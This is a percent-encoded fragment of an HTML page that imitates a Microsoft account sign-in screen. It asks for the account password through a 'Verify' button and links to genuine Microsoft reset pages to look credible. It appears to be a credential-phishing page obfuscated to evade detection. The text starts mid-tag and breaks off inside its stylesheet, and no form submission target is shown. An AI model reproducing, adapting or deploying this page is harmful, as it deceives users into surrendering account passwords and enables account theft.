%69%76%20%69%64%3d%22%65%72%72%6f%72%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%50%6c%65%61%73%65%20%65%6e%74%65%72%20%74%68%65%20%70%61%73%73%77%6f%72%64%20%66%6f%72%20%79%6f%75%72%20%4d%69%63%72%6f%73%6f%66%74%20%61%63%63%6f%75%6e%74%2e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%69%6e%70%75%74%20%63%6c%61%73%73%3d%22%70%61%73%73%77%6f%72%64%69%6e%70%75%74%22%20%69%64%3d%22%70%61%73%73%77%6f%72%64%22%20%6e%61%6d%65%3d%22%70%61%73%73%77%64%22%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%20%61%75%74%6f%63%6f%6d%70%6c%65%74%65%3d%22%6f%66%66%22%20%70%6c%61%63%65%68%6f%6c%64%65%72%3d%22%50%61%73%73%77%6f%72%64%22%20%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%70%3e%3c%73%70%61%6e%20%73%74%79%6c%65%3d%22%66%6f%6e%74%2d%73%69%7a%65%3a%20%2e%38%31%32%35%72%65%6d%3b%22%3e%48%61%76%69%6e%67%20%74%72%6f%75%62%6c%65%3f%3c%2f%73%70%61%6e%3e%20%3c%61%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%61%63%63%6f%75%6e%74%2e%6c%69%76%65%2e%63%6f%6d%2f%52%65%73%65%74%50%61%73%73%77%6f%72%64%2e%61%73%70%78%22%3e%53%69%67%6e%20%69%6e%20%61%6e%6f%74%68%65%72%20%77%61%79%3c%2f%61%3e%3c%2f%70%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%70%3e%3c%61%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%61%63%63%6f%75%6e%74%2e%6c%69%76%65%2e%63%6f%6d%2f%52%65%73%65%74%50%61%73%73%77%6f%72%64%2e%61%73%70%78%22%3e%4d%6f%72%65%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%3c%2f%61%3e%3c%2f%70%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%62%75%74%74%6f%6e%63%6f%6e%74%61%69%6e%65%72%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%73%75%62%6d%69%74%22%20%69%64%3d%22%73%75%62%6d%69%74%22%20%63%6c%61%73%73%3d%22%62%75%74%74%6f%6e%22%20%76%61%6c%75%65%3d%22%56%65%72%69%66%79%22%20%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0a%20%20%20%20%20%20%20%20%3c%2f%64%69%76%3e%0a%20%20%20%20%3c%2f%64%69%76%3e%0a%3c%2f%62%6f%64%79%3e%0a%3c%68%65%61%64%3e%0a%3c%74%69%74%6c%65%3e%53%69%67%6e%20%69%6e%20%74%6f%20%79%6f%75%72%20%61%63%63%6f%75%6e%74%3c%2f%74%69%74%6c%65%3e%0a%3c%73%74%79%6c%65%3e%0a%62%6f%64%79%20%7b%0a%20%20%20%20%66%6f%6e%74%2d%66%61%6d%69%6c%79%3a%20%22%53%65%67%6f%65%20%55%49%20%57%65%62%66%6f%6e%74%22%2c%2d%61%70%70%6c%65%2d%73%79%73%74%65%6d%2c%22%48%65%6c%76%65%74%69%63%61%20%4e%65%75%65%22%2c%22%4c%75%63%69%64%61%20%47%72%61%6e%64%65%22%2c%22%52%6f%62%6f%74%6f%22%2c%22%45%62%72%69%6d%61%22%2c%22%4e%69%72%6d%61%6c%61%20%55%49%22%2c%22%47%61%64%75%67%69%22%2c%22%53%65%67%6f%65%20%58%62%6f%78%20%53%79%6d%62%6f%6c%22%2c%22%53%65%67%6f%65%20%55%49%20%53%79%6d%62%6f%6c%22%2c%22%4d%65%69%72%79%6f%20%55%49%22%2c%22%4b%68%6d%65%72%20%55%49%22%2c%22%54%75%6e%67%61%22%2c%22%4c%61%6f%20%55%49%22%2c%22%52%61%61%76%69%22%2c%22%49%73%6b%6f%6f%6c%61%20%50%6f%74%61%22%2c%22%4c%61%74%68%61%22%2c%22%4c%65%65%6c%61%77%61%64%65%65%22%2c%22%4d%69%63%72%6f%73%6f%66%74%20%59%61%48%65%69%20%55%49%22%2c%22%4d%69%63%72%6f%73%6f%66%74%20%4a%68%65%6e%67%48%65%69%20%55%49%22%2c%22%4d%61%6c%67%75%6e%20%47%6f%74%68%69%63%22%2c%22%45%73%74%72%61%6e%67%65%6c%6f%20%45%64%65%73%73%61%22%2c%22%4d%69%63%72%6f%73%6f%66%74%20%48%69%6d%61%6c%61%79%61%22%2c%22%4d%69%63%72%6f%73%6f%66%74%20%4e%65%77%20%54%61%69%20%4c%75%65%22%2c%22%4d%69%63%72%6f%73%6f%66%74%20%50%68%61%67%73%50%61%22%2c%22%4d%69%63%72%6f%73%6f%66%74%20%54%61%69%20%4c%65%22%2c%22%4d%69%63%72%6f%73%6f%66%74%20%59%69%20%42%61%69%74%69%22%2c%22%4d%6f%6e%67%6f%6c%69%61%6e%20%42%61%69%74%69%22%2c%22%4d%56%20%42%6f%6c%69%22%2c%22%4d%79%61%6e%6d%61%72%20%54%65%78%74%22%2c%22%43%61%6d%62%72%69%61%20%4d%61%74%68%22%3b%0a%20%20%20%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%35%70%78%3b%0a%20%20%20%20%6c%69%6e%65%2d%68%65%69%67%68%74%3a%20%32%30%70%78%3b%0a%20%20%20%20%66%6f%6e%74%2d%77%65%69%67%68%74%3a%20%34%30%30%3b%0a%20%20%20%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%2e%39%33%37%35%72%65%6d%3b%0a%20%20%20%20%6c%69%6e%65%2d%68%65%69%67%68%74%3a%20%31%2e%32%35%72%65%6d%3b%0a%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%75%72%6c%28%64%61%74%61%3a%69%6d%61%67%65%2f%73%76%67%2b%78%6d%6c%3b%62%61%73%65%36%34%2c%50%44%39%34%62%57%77%67%64%6d%56%79%63%32%6c%76%62%6a%30%69%4d%53%34%77%49%69%42%6c%62%6d%4e%76%5a%47%6c%75%5a%7a%30%69%56%56%52%47%4c%54%67%69%50%7a%34%4b%50%48%4e%32%5a%79%42%33%61%57%52%30%61%44%30%69%4d%54%42%74%62%53%49%67%61%47%56%70%5a%32%68%30%50%53%49%78%4d%47%31%74%49%69%42%32%5a%58%4a%7a%61%57%39%75%50%53%49%78%4c%6a%45%69%49%48%5a%70%5a%58%64%43%62%33%67%39%49%6a%41%67%4d%43%41%78%4d%43%41%78%4d%43%49%67%65%47%31%73%62%6e%4d%39%49%6d%68%30%64%48%41%36%4c%79%39%33%64%33%63%75%64%7a%4d%75%62%33%4a%6e%4c%7a%49%77%4d%44%41%76%63%33%5a%6e%49%69%42%34%62%57%78%75%63%7a%70%6a%59%7a%30%69%61%48%52%30%63%44%6f%76%4c%32%4e%79%5a%57%46%30%61%58%5a%6c%59%32%39%74%62%57%39%75%63%79%35%76%63%6d%63%76%62%6e%4d%6a%49%69%42%34%62%57%78%75%63%7a%70%6b%59%7a%30%69%61%48%52%30%63%44%6f%76%4c%33%42%31%63%6d%77%75%62%33%4a%6e%4c%32%52%6a%4c%32%56%73%5a%57%31%6c%62%6e%52%7a%4c%7a%45%75%4d%53%38%69%49%48%68%74%62%47%35%7a%4f%6e%4a%6b%5a%6a%30%69%61%48%52%30%63%44%6f%76%4c%33%64%33%64%79%35%33%4d%79%35%76%63%6d%63%76%4d%54%6b%35%4f%53%38%77%4d%69%38%79%4d%69%31%79%5a%47%59%74%63%33%6c%75%64%47%46%34%4c%57%35%7a%49%79%49%67%65%47%31%73%62%6e%4d%36%65%47%78%70%62%6d%73%39%49%6d%68%30%64%48%41%36%4c%79%39%33%64%33%63%75%64%7a%4d%75%62%33%4a%6e%4c%7a%45%35%4f%54%6b%76%65%47%78%70%62%6d%73%69%50%67%6f%67%50%47%52%6c%5a%6e%4d%2b%43%69%41%67%50%48%4a%68%5a%47%6c%68%62%45%64%79%59%57%52%70%5a%57%35%30%49%47%6c%6b%50%53%4a%79%59%57%52%70%59%57%78%48%63%6d%46%6b%61%57%56%75%64%44%45%77%4e%54%6b%69%49%47%4e%34%50%53%49%33%4c%6a%55%35%4e%44%59%69%49%47%4e%35%50%53%49%79%4c%6a%45%32%4e%53%49%67%63%6a%30%69%4e%43%34%79%4d%7a%51%79%49%69%42%6e%63%6d%46%6b%61%57%56%75%64%46%52%79%59%57%35%7a%5a%6d%39%79%62%54%30%69%62%57%46%30%63%6d%6c%34%4b%44%45%67%4d%43%41%77%49%43%34%35%4e%7a%55%30%4d%79%41%74%4c%6a%45%78%4e%54%4d%32%49%43%34%79%4e%44%6b%30%4e%43%6b%69%49%47%64%79%59%57%52%70%5a%57%35%30%56%57%35%70%64%48%4d%39%49%6e%56%7a%5a%58%4a%54%63%47%46%6a%5a%55%39%75%56%58%4e%6c%49%6a%34%4b%49%43%41%67%50%48%4e%30%62%33%41%67%63%33%52%76%63%43%31%6a%62%32%78%76%63%6a%30%69%49%32%51%31%5a%54%4a%6d%5a%69%49%67%62%32%5a%6d%63%32%56%30%50%53%49%77%49%69%38%2b%43%69%41%67%49%44%78%7a%64%47%39%77%49%48%4e%30%62%33%41%74%59%32%39%73%62%33%49%39%49%69%4e%6b%4e%57%55%79%5a%6d%59%69%49%48%4e%30%62%33%41%74%62%33%42%68%59%32%6c%30%65%54%30%69%4d%43%49%67%62%32%5a%6d%63%32%56%30%50%53%49%78%49%69%38%2b%43%69%41%67%50%43%39%79%59%57%52%70%59%57%78%48%63%6d%46%6b%61%57%56%75%64%44%34%4b%49%43%41%38%63%6d%46%6b%61%57%46%73%52%33%4a%68%5a%47%6c%6c%62%6e%51%67%61%57%51%39%49%6e%4a%68%5a%47%6c%68%62%45%64%79%59%57%52%70%5a%57%35%30%4d%54%41%35%4f%53%49%67%59%33%67%39%49%6a%49%75%4e%54%6b%77%4f%43%49%67%59%33%6b%39%49%6a%59%75%4e%54%59%7a%4e%43%49%67%63%6a%30%69%4e%43%34%79%4d%7a%51%79%49%69%42%6e%63%6d%46%6b%61%57%56%75%64%46%52%79%59%57%35%7a%5a%6d%39%79%62%54%30%69%62%57%46%30%63%6d%6c%34%4b%44%45%67%4d%43%41%77%49%43%34%35%4e%7a%55%30%4d%79%41%74%4c%6a%51%31%4e%54%4d%78%49%44%45%75%4e%44%41%7a%4f%43%6b%69%49%47%64%79%59%57%52%70%5a%57%35%30%56%57%35%70%64%48%4d%39%49%6e%56%7a%5a%58%4a%54%63%47%46%6a%5a%55%39%75%56%58%4e%6c%49%6a%34%4b%49%43%41%67%50%48%4e%30%62%33%41%67%63%33%52%76%63%43%31%6a%62%32%78%76%63%6a%30%69%49%32%51%31%5a%6a%46%6b%4e%53%49%67%62%32%5a%6d%63%32%56%30%50%53%49%77%49%69%38%2b%43%69%41%67%49%44%78%7a%64%47%39%77%49%48%4e%30%62%33%41%74%59%32%39%73%62%33%49%39%49%69%4e%6b%4e%57%59%78%5a%44%55%69%49%48%4e%30%62%33%41%74%62%33%42%68%59%32%6c%30%65%54%30%69%4d%43%49%67%62%32%5a%6d%63%32%56%30%50%53%49%78%49%69%38%2b%43%69%41%67%50%43%39%79%59%57%52%70%59%57%78%48%63%6d%46%6b%61%57%56%75%64%44%34%4b%49%43%41%38%63%6d%46%6b%61%57%46%73%52%33%4a%68%5a%47%6c%6c%62%6e%51%67%61%57%51%39%49%6e%4a%68%5a%47%6c%68%62%45%64%79%59%57%52%70%5a%57%35%30%4d%54%41%79%4e%79%30%78%49%69%42%6a%65%44%30%69%4d%69%34%34%4d%6a%63%35%49%69%42%6a%65%54%30%69%4d%69%34%33%4d%7a%41%78%49%69%42%79%50%53%49%7a%4c%6a%51%35%4f%54%45%69%49%47%64%79%59%57%52%70%5a%57%35%30%56%48%4a%68%62%6e%4e%6d%62%33%4a%74%50%53%4a%74%59%58%52%79%61%58%67%6f%4d%53%34%79%4d%54%41%78%49%44%41%67%4d%43%41%78%4c%6a%45%34%4d%44%51%67%4e%43%34%7a%4f%44%67%79%49%44%51%75%4e%44%67%31%4b%53%49%67%5a%33%4a%68%5a%47%6c%6c%62%6e%52%56%62%6d%6c%30%63%7a%30%69%64%58%4e%6c%63%6c%4e%77%59%57%4e%6c%54%32%35%56%63%32%55%69%50%67%6f%67%49%43%41%38%63%33%52%76%63%43%42%7a%64%47%39%77%4c%57%4e%76%62%47%39%79%50%53%49%6a%5a%6d%5a%69%5a%57%4a%6c%49%69%42%76%5a%6d%5a%7a%5a%58%51%39%49%6a%41%69%4c%7a%34%4b%49%43%41%67%50%48%4e%30%62%33%41%67%63%33%52%76%63%43%31%6a%62%32%78%76%63%6a%30%69%49%32%5a%6d%59%6d%56%69%5a%53%49%67%63%33%52%76%63%43%31%76%63%47%46%6a%61%58%52%35%50%53%49%77%49%69%42%76%5a%6d%5a%7a%5a%58%51%39%49%6a%45%69%4c%7a%34%4b%49%43%41%38%4c%33%4a%68%5a%47%6c%68%62%45%64%79%59%57%52%70%5a%57%35%30%50%67%6f%67%49%44%78%79%59%57%52%70%59%57%78%48%63%6d%46%6b%61%57%56%75%64%43%42%70%5a%44%30%69%63%6d%46%6b%61%57%46%73%52%33%4a%68%5a%47%6c%6c%62%6e%51%78%4d%54%4d%78%49%69%42%6a%65%44%30%69%4d%69%34%77%4f%54%63%32%49%69%42%6a%65%54%30%69%4d%69%34%77%4d%44%63%35%49%69%42%79%50%53%49%30%4c%6a%49%7a%4e%44%49%69%49%47%64%79%59%57%52%70%5a%57%35%30%56%48%4a%68%62%6e%4e%6d%62%33%4a%74%50%53%4a%74%59%58%52%79%61%58%67%6f%4d%53%41%77%49%44%41%67%4c%6a%6b%33%4e%54%51%7a%49%43%34%34%4d%7a%49%32%4e%69%41%75%4e%7a%6b%77%4f%54%51%70%49%69%42%6e%63%6d%46%6b%61%57%56%75%64%46%56%75%61%58%52%7a%50%53%4a%31%63%32%56%79%55%33%42%68%59%32%56%50%62%6c%56%7a%5a%53%49%2b%43%69%41%67%49%44%78%7a%64%47%39%77%49%48%4e%30%62%33%41%74%59%32%39%73%62%33%49%39%49%69%4e%6d%5a%6d%59%79%59%32%4d%69%49%47%39%6d%5a%6e%4e%6c%64%44%30%69%4d%43%49%76%50%67%6f%67%49%43%41%38%63%33%52%76%63%43%42%7a%64%47%39%77%4c%57%4e%76%62%47%39%79%50%53%49%6a%5a%6d%5a%6d%4d%6d%4e%6a%49%69%42%7a%64%47%39%77%4c%57%39%77%59%57%4e%70%64%48%6b%39%49%6a%41%69%49%47%39%6d%5a%6e%4e%6c%64%44%30%69%4d%53%49%76%50%67%6f%67%49%44%77%76%63%6d%46%6b%61%57%46%73%52%33%4a%68%5a%47%6c%6c%62%6e%51%2b%43%69%41%38%4c%32%52%6c%5a%6e%4d%2b%43%69%41%38%62%57%56%30%59%57%52%68%64%47%45%2b%43%69%41%67%50%48%4a%6b%5a%6a%70%53%52%45%59%2b%43%69%41%67%49%44%78%6a%59%7a%70%58%62%33%4a%72%49%48%4a%6b%5a%6a%70%68%59%6d%39%31%64%44%30%69%49%6a%34%4b%49%43%41%67%49%44%78%6b%59%7a%70%6d%62%33%4a%74%59%58%51%2b%61%57%31%68%5a%32%55%76%63%33%5a%6e%4b%33%68%74%62%44%77%76%5a%47%4d%36%5a%6d%39%79%62%57%46%30%50%67%6f%67%49%43%41%67%50%47%52%6a%4f%6e%52%35%63%47%55%67%63%6d%52%6d%4f%6e%4a%6c%63%32%39%31%63%6d%4e%6c%50%53%4a%6f%64%48%52%77%4f%69%38%76%63%48%56%79%62%43%35%76%63%6d%63%76%5a%47%4d%76%5a%47%4e%74%61%58%52%35%63%47%55%76%55%33%52%70%62%47%78%4a%62%57%46%6e%5a%53%49%76%50%67%6f%67%49%43%41%67%50%47%52%6a%4f%6e%52%70%64%47%78%6c%4c%7a%34%4b%49%43%41%67%50%43%39%6a%59%7a%70%58%62%33%4a%72%50%67%6f%67%49%44%77%76%63%6d%52%6d%4f%6c%4a%45%52%6a%34%4b%49%44%77%76%62%57%56%30%59%57%52%68%64%47%45%2b%43%69%41%38%5a%7a%34%4b%49%43%41%38%5a%57%78%73%61%58%42%7a%5a%53%42%30%63%6d%46%75%63%32%5a%76%63%6d%30%39%49%6e%4a%76%64%47%46%30%5a%53%67%75%4d%54%4d%35%4d%44%6b%70%49%69%42%6a%65%44%30%69%4d%69%34%35%4d%7a%41%7a%49%69%42%6a%65%54%30%69%4d%69%34%33%4e%44%6b%31%49%69%42%79%65%44%30%69%4e%43%34%79%4d%7a%51%79%49%69%42%79%65%54%30%69%4e%43%34%78%4d%7a%41%79%49%69%42%6d%61%57%78%73%50%53%4a%31%63%6d%77%6f%49%33%4a%68%5a%47%6c%68%62%45%64%79%59%57%52%70%5a%57%35%30%4d%54%45%7a%4d%53%6b%69%49%48%4e%30%65%57%78%6c%50%53%4a%74%61%58%67%74%59%6d%78%6c%62%6d%51%74%62%57%39%6b%5a%54%70%76%64%6d%56%79%62%47%46%35%49%69%38%2b%43%69%41%67%50%47%56%73%62%47%6c%77%63%32%55%67%64%48%4a%68%62%6e%4e%6d%62%33%4a%74%50%53%4a%79%62%33%52%68%64%47%55%6f%4c%6a%45%7a%4f%54%41%35%4b%53%49%67%59%33%67%39%49%6a%63%75%4e%44%63%35%4d%69%49%67%59%33%6b%39%49%6a%49%75%4d%7a%59%78%4d%69%49%67%63%6e%67%39%49%6a%51%75%4d%6a%4d%30%4d%69%49%67%63%6e%6b%39%49%6a%51%75%4d%54%4d%77%4d%69%49%67%5a%6d%6c%73%62%44%30%69%64%58%4a%73%4b%43%4e%79%59%57%52%70%59%57%78%48%63%6d%46%6b%61%57%56%75%64%44%45%77%4e%54%6b%70%49%69%42%7a%64%48%6c%73%5a%54%30%69%62%57%6c%34%4c%57%4a%73%5a%57%35%6b%4c%57%31%76%5a%47%55%36%62%33%5a%6c%63%6d%78%68%65%53%49%76%50%67%6f%67%49%44%78%6c%62%47%78%70%63%48%4e%6c%49%48%52%79%59%57%35%7a%5a%6d%39%79%62%54%30%69%63%6d%39%30%59%58%52%6c%4b%43%34%78%4d%7a%6b%77%4f%53%6b%69%49%47%4e%34%50%53%49%79%4c%6a%45%7a%4e%54%55%69%49%47%4e%35%50%53%49%33%4c%6a%67%77%4e%69%49%67%63%6e%67%39%49%6a%51%75%4d%6a%4d%30%4d%69%49%67%63%6e%6b%39%49%6a%51%75%4d%54%4d%77%4d%69%49%67%5a%6d%6c%73%62%44%30%69%64%58%4a%73%4b%43%4e%79%59%57%52%70%59%57%78%48%63%6d%46%6b%61%57%56%75%64%44%45%77%4f%54%6b%70%49%69%42%7a%64%48%6c%73%5a%54%30%69%62%57%6c%34%4c%57%4a%73%5a%57%35%6b%4c%57%31%76%5a%47%55%36%62%6d%39%79%62%57%46%73%49%69%38%2b%43%69%41%67%50%47%56%73%62%47%6c%77%63%32%55%67%64%48%4a%68%62%6e%4e%6d%62%33%4a%74%50%53%4a%79%62%33%52%68%64%47%55%6f%4c%6a%45%7a%4f%54%41%35%4b%53%49%67%59%33%67%39%49%6a%63%75%4f%44%45%77%4d%69%49%67%59%33%6b%39%49%6a%63%75%4e%7a%41%33%4e%53%49%67%63%6e%67%39%49%6a%51%75%4d%6a%4d%30%4d%69%49%67%63%6e%6b%39%49%6a%51%75%4d%54%4d%77%4d%69%49%67%5a%6d%6c%73%62%44%30%69%64%58%4a%73%4b%43%4e%79%59%57%52%70%59%57%78%48%63%6d%46%6b%61%57%56%75%64%44%45%77%4d%6a%63%74%4d%53%6b%69%49%48%4e%30%65%57%78%6c%50%53%4a%74%61%58%67%74%59%6d%78%6c%62%6d%51%74%62%57%39%6b%5a%54%70%75%62%33%4a%74%59%57%77%69%4c%7a%34%4b%49%44%77%76%5a%7a%34%4b%50%43%39%7a%64%6d%63%2b%43%67%3d%3d%29%20%20%6e%6f%2d%72%65%70%65%61%74%20%66%69%78%65%64%20%63%65%6e%74%65%72%3b%20%0a%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%2d%73%69%7a%65%3a%20%63%6f%76%65%72%3b%0a%20%20%20%20%6d%61%72%67%69%6e%3a%20%30%3b%0a%7d%0a%61%20%7b%0a%20%20%20%20%63%6f%6c%6f%72%3a%20%23%30%30%36%37%62%38%3b%0a%20%20%20%20%74%65%78%74%2d%64%65%63%6f%72%61%74%69%6f%6e%3a%20%6e%6f%6e%65%3b%0a%20%20%20%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%2e%38%31%32%35%72%65%6d%3b%0a%7d%0a%2e%6f%76%65%72%6c%61%79%20%7b%0a%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%23%31%30%31%30%31%30%3b%0a%20%20%20%20%6f%70%61%63%69%74%79%3a%20%2e%31%3b%0a%20%20%20%20%70%6f%73%69%74%69%6f%6e%3a%20%66%69%78%65%64%3b%0a%20%20%20%20%74%6f%70%3a%20%30%3b%0a%20%20%20%20%6c%65%66%74%3a%20%30%3b%0a%20%20%20%20%68%65%69%67%68%74%3a%20%31%30%30%76%68%3b%0a%20%20%20%20%77%69%64%74%68%3a%20%31%30%30%76%77%3b%0a%20%20%20%20%7a%2d%69%6e%64%65%78%3a%20%30%3b%0a%7d%0a%2e%66%6f%6f%74%65%72%20%7b%0a%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%72%67%62%61%28%32%30%2c%32%30%2c%32%30%2c%20%30%2e%36%29%3b%0a%20%20%20%20%70%6f%73%69%74%69%6f%6e%3a%20%66%69%78%65%64%3b%0a%20%20%20%20%62%6f%74%74%6f%6d%3a%20%30%3b%0a%20%20%20%20%68%65%69%67%68%74%3a%20%32%38%70%78%3b%0a%20%20%20%20%77%69%64%74%68%3a%20%31%30%30%76%77%3b%0a%20%20%20%20%7a%2d%69%6e%64%65%78%3a%20%30%3b%0a%7d%0a%2e%66%6f%6f%74%65%72%74%65%78%74%20%7b%0a%20%20%20%20%70%6f%73%69%74%69%6f%6e%3a%20%66%69%78%65%64%3b%0a%20%20%20%20%72%69%67%68%74%3a%20%30%3b%0a%20%20%20%20%74%65%78%74%2d%61%6c%69%67%6e%3a%20%72%69%67%68%74%3b%0a%20%20%20%20%63%6f%6c%6f%72%3a%20%23%66%66%66%3b%0a%20%20%20%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%32%70%78%3b%0a%20%20%20%20%6c%69%6e%65%2d%68%65%69%67%68%74%3a%20%32%38%70%78%3b%0a%20%20%20%20%77%68%69%74%65%2d%73%70%61%63%65%3a%20%6e%6f%77%72%61%70%3b%0a%20%20%20%20%64%69%73%70%6c%61%79%3a%20%69%6e%6c%69%6e%65%2d%62%6c%6f%63%6b%3b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%6c%65%66%74%3a%20%38%70%78%3b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%72%69%67%68%74%3a%20%35%30%70%78%3b%0a%7d%0a%2e%6f%75%74%65%72%20%7b%0a%20%20%20%20%64%69%73%70%6c%61%79%3a%20%74%61%62%6c%65%3b%0a%20%20%20%20%70%6f%73%69%74%69%6f%6e%3a%20%61%62%73%6f%6c%75%74%65%3b%0a%20%20%20%20%68%65%69%67%68%74%3a%20%31%30%30%25%3b%0a%20%20%20%20%77%69%64%74%68%3a%20%31%30%30%25%3b%0a%20%20%20%20%7a%2d%69%6e%64%65%78%3a%20%31%30%3b%0a%7d%0a%2e%6d%69%64%64%6c%65%20%7b%0a%20%20%20%20%64%69%73%70%6c%61%79%3a%20%74%61%62%6c%65%2d%63%65%6c%6c%3b%0a%20%20%20%20%76%65%72%74%69%63%61%6c%2d%61%6c%69%67%6e%3a%20%6d%69%64%64%6c%65%3b%0a%7d%0a%2e%73%69%67%6e%2d%69%6e%2d%62%6f%78%20%7b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%6c%65%66%74%3a%20%61%75%74%6f%3b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%72%69%67%68%74%3a%20%61%75%74%6f%3b%0a%20%20%20%20%70%6f%73%69%74%69%6f%6e%3a%20%72%65%6c%61%74%69%76%65%3b%0a%20%20%20%20%6d%61%78%2d%77%69%64%74%68%3a%20%34%30%30%70%78%3b%0a%20%20%20%20%77%69%64%74%68%3a%20%63%61%6c%63%28%31%30%30%25%20%2d%20%34%30%70%78%29%3b%0a%20%20%20%20%70%61%64%64%69%6e%67%3a%20%34%34%70%78%3b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%62%6f%74%74%6f%6d%3a%20%32%38%70%78%3b%0a%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%23%66%66%66%3b%0a%20%20%20%20%2d%77%65%62%6b%69%74%2d%62%6f%78%2d%73%68%61%64%6f%77%3a%20%30%20%32%70%78%20%36%70%78%20%72%67%62%61%28%30%2c%30%2c%30%2c%2e%32%29%3b%0a%20%20%20%20%2d%6d%6f%7a%2d%62%6f%78%2d%73%68%61%64%6f%77%3a%20%30%20%32%70%78%20%36%70%78%20%72%67%62%61%28%30%2c%30%2c%30%2c%2e%32%29%3b%0a%20%20%20%20%62%6f%78%2d%73%68%61%64%6f%77%3a%20%30%20%32%70%78%20%36%70%78%20%72%67%62%61%28%30%2c%30%2c%30%2c%2e%32%29%3b%0a%20%20%20%20%6d%69%6e%2d%77%69%64%74%68%3a%20%33%30%30%70%78%3b%0a%20%20%20%20%6d%69%6e%2d%68%65%69%67%68%74%3a%20%33%30%30%70%78%3b%0a%20%20%20%20%6f%76%65%72%66%6c%6f%77%3a%20%68%69%64%64%65%6e%3b%0a%7d%0a%0a%2e%77%69%6e%2d%73%63%72%6f%6c%6c%20%7b%0a%20%20%20%20%62%6f%78%2d%73%69%7a%69%6e%67%3a%20%62%6f%72%64%65%72%2d%62%6f%78%3b%0a%7d%0a%2e%6c%6f%67%6f%20%7b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%62%6f%74%74%6f%6d%3a%20%31%30%70%78%3b%0a%20%20%20%20%62%6f%78%2d%73%69%7a%69%6e%67%3a%20%62%6f%72%64%65%72%2d%62%6f%78%3b%0a%7d%0a%2e%6c%6f%67%6f%5f%69%6d%61%67%65%20%7b%0a%20%20%20%20%68%65%69%67%68%74%3a%20%34%30%70%78%3b%0a%7d%0a%2e%64%69%73%70%6c%61%79%5f%6e%61%6d%65%20%7b%0a%20%20%20%20%6c%69%6e%65%2d%68%65%69%67%68%74%3a%20%32%34%70%78%3b%0a%20%20%20%20%77%68%69%74%65%2d%73%70%61%63%65%3a%20%6e%6f%77%72%61%70%3b%0a%20%20%20%20%6f%76%65%72%66%6c%6f%77%3a%20%68%69%64%64%65%6e%3b%0a%20%20%20%20%74%65%78%74%2d%6f%76%65%72%66%6c%6f%77%3a%20%65%6c%6c%69%70%73%69%73%3b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%62%6f%74%74%6f%6d%3a%20%31%35%70%78%3b%0a%7d%0a%2e%70%72%6f%6d%70%74%20%7b%0a%20%20%20%20%63%6f%6c%6f%72%3a%20%23%31%62%31%62%31%62%3b%0a%20%20%20%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%2e%35%72%65%6d%3b%0a%20%20%20%20%66%6f%6e%74%2d%77%65%69%67%68%74%3a%20%36%30%30%3b%0a%20%20%20%20%70%61%64%64%69%6e%67%3a%20%30%3b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%74%6f%70%3a%20%31%36%70%78%3b%0a%20%20%20%20%6d%61%72%67%69%6e%2d%62%6f%74%74%6f%6d%3a%20%31%35%70%78%3b%0a%7d%0a%23%65%72%72%6f%72%20%7b%0a%20%20%20%20%63%6f%6c%6f%72%3a%20%72%65%64%3b%0a%20%20%20%20%64%69%73%70%6c%61%79%3a%20%6e%6f%6e%65%3b%0a%7d%0a%2e%70%61%73%73%77%6f%72%64%69%6e%70%75%74%20%7b%0a%20%20%20%20%70%61%64%64%69%6e%67%3a%20%34%70%78%20%38%70%78%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%73%74%79%6c%65%3a%20%73%6f%6c%69%64%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%77%69%64%74%68%3a%20%32%70%78%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%63%6f%6c%6f%72%3a%20%72%67%62%61%28%30%2c%30%2c%30%2c%2e%34%29%3b%0a%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%72%67%62%61%28%32%35%35%2c%32%35%35%2c%32%35%35%2c%2e%34%29%3b%0a%20%20%20%20%68%65%69%67%68%74%3a%20%33%32%70%78%3b%0a%20%20%20%20%68%65%69%67%68%74%3a%20%32%72%65%6d%3b%0a%20%20%20%20%70%61%64%64%69%6e%67%3a%20%36%70%78%20%31%30%70%78%3b%0a%20%20%20%20%70%61%64%64%69%6e%67%2d%6c%65%66%74%3a%20%31%30%70%78%3b%0a%20%20%20%20%62%6f%72%64%65%72%2d%77%69%64%74%68%3a%20%31%70%78%3b%0a%20%20%20%20%62%6f%72%6